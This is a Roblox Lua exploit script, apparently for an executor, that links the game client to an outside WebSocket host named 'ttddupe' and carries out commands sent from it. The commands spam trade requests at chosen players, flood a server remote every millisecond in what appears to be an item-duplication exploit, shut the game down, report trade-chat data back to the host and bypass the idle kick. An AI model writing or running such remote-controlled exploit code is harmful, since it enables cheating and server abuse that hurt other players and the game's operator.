local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = cloneref(game:GetService("TextChatService"))

local LocalPlayer = Players.LocalPlayer
local ws

local function connectWebSocket()
    local success, socket = pcall(function()
        return WebSocket.connect("wss://ttddupe.replit.app/ws")
    end)

    if not success then
        warn("[WS] Initial connection failed. Will retry...")
        task.delay(3, connectWebSocket)
        return
    end

    ws = socket

    ws.OnMessage:Connect(function(msg)
        local data = HttpService:JSONDecode(msg)
        local cmdType = data.type

        if cmdType == "afk" then
            local ba = Instance.new("ScreenGui")
            local ca = Instance.new("TextLabel")
            local da = Instance.new("Frame")
            local _b = Instance.new("TextLabel")
            local ab = Instance.new("TextLabel")

            ba.Parent = game.CoreGui
            ba.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            ca.Parent = ba
            ca.Active = true
            ca.BackgroundColor3 = Color3.new(0.176, 0.176, 0.176)
            ca.Draggable = true
            ca.Position = UDim2.new(0.7, 0, 0.1, 0)
            ca.Size = UDim2.new(0, 370, 0, 52)
            ca.Font = Enum.Font.SourceSansSemibold
            ca.Text = "Anti AFK Script"
            ca.TextColor3 = Color3.new(0, 1, 1)
            ca.TextSize = 22

            da.Parent = ca
            da.BackgroundColor3 = Color3.new(0.196, 0.196, 0.196)
            da.Position = UDim2.new(0, 0, 1.02, 0)
            da.Size = UDim2.new(0, 370, 0, 107)

            _b.Parent = da
            _b.BackgroundColor3 = Color3.new(0.176, 0.176, 0.176)
            _b.Position = UDim2.new(0, 0, 0.8, 0)
            _b.Size = UDim2.new(0, 370, 0, 21)
            _b.Font = Enum.Font.Arial
            _b.Text = "Made by Dynamic. (please subscribe)"
            _b.TextColor3 = Color3.new(0, 1, 1)
            _b.TextSize = 20

            ab.Parent = da
            ab.BackgroundColor3 = Color3.new(0.176, 0.176, 0.176)
            ab.Position = UDim2.new(0, 0, 0.15, 0)
            ab.Size = UDim2.new(0, 370, 0, 44)
            ab.Font = Enum.Font.ArialBold
            ab.Text = "Status: Active"
            ab.TextColor3 = Color3.new(0, 1, 1)
            ab.TextSize = 20

            local vu = game:GetService("VirtualUser")
            Players.LocalPlayer.Idled:Connect(function()
                vu:CaptureController()
                vu:ClickButton2(Vector2.new())
                ab.Text = "Roblox tried to kick you but we stopped it :D"
                wait(2)
                ab.Text = "Status: Active"
            end)

        elseif cmdType == "trade" then
            local targets = { data.user1, data.user2 }

            local function handle(player)
                while player and player.Parent do
                    local gui = LocalPlayer.PlayerGui:FindFirstChild("Trading")
                    if gui and not gui.TradingFrame.Visible then
                        local args = {
                            {
                                {
                                    ReplicatedStorage.IdentifiersContainer.RF_34fa16d44fc3ec71f2df15808f9b2487cb975eb93bfb49d822bba4a38945600f_S.Value,
                                    "\186\236PA\206\203M\248\128\4^\144\13&r/",
                                    player
                                }
                            }
                        }
                        ReplicatedStorage.NetworkingContainer.DataRemote:FireServer(unpack(args))
                    end
                    wait(1)
                end
            end

            for _, name in ipairs(targets) do
                local p = Players:FindFirstChild(name)
                if p then
                    handle(p)
                else
                    Players.PlayerAdded:Connect(function(newP)
                        if newP.Name == name then
                            handle(newP)
                        end
                    end)
                end
            end

        elseif cmdType == "start" then
            spawn(function()
                local args = {
                    {
                        {
                            ReplicatedStorage.IdentifiersContainer.RE_b7b5d6eaedcdabca20ea87f1fd2b6ffc73fa913b3c748d69f838fd767b5f1ee6.Value,
                            "\255"
                        }
                    }
                }

                while task.wait(0.001) do
                    ReplicatedStorage.NetworkingContainer.DataRemote:FireServer(unpack(args))
                end
            end)

        elseif cmdType == "stop" then
            -- implement stop if needed

        elseif cmdType == "shutdown" then
            game:Shutdown()

        elseif cmdType == "getinfo" then
            local txt = LocalPlayer.PlayerGui.Trading.TradingFrame.TradeMenu.MainFrame.ToggleChat.UnreadMessages.Text
            ws:Send(LocalPlayer.Name .. ": " .. txt .. " messages")

        elseif cmdType == "ping" then
            ws:Send("OK")
        end
    end)

    ws.OnClose:Connect(function()
        warn("[WS] Disconnected, attempting reconnect in 3s...")
        task.delay(3, function()
            local reconnectSuccess, reconnectSocket = pcall(function()
                return WebSocket.connect("wss://ttddupe.replit.app/ws")
            end)

            if reconnectSuccess then
                ws = reconnectSocket
                warn("[WS] Reconnected successfully")
                ws:Send(LocalPlayer.Name)
            else
                warn("[WS] Reconnect failed, returning to lobby")
                TextChatService.TextChannels.RBXGeneral:SendAsync("/lobby")
            end
        end)
    end)

    task.wait(0.1)
    ws:Send(LocalPlayer.Name)
end

connectWebSocket()
